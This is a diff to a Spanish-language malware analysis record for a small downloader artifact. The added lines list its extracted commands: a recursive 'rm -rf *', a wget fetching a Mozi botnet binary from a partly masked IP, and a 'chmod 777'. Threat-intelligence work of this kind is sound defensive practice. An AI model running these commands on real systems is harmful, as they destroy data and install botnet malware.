@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 795 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `XMLSchema` en `hxxp://www[.]w3[.]org/2001/XMLSchema`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 795 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `XMLSchema` en `hxxp://www[.]w3[.]org/2001/XMLSchema`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `rm -rf *`
+2. `wget hxxp://144.48.132.XXX:47044/Mozi.m`
+3. `chmod 777 /t` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/224b54e3a0f8681d27e023408bad7943b33c55ee587650bffb858a66d7207d4a.md](../../../../../malware-like/oraculo/downloader/224b54e3a0f8681d27e023408bad7943b33c55ee587650bffb858a66d7207d4a.md)
 
 
 ## 🏷️ Clasificación
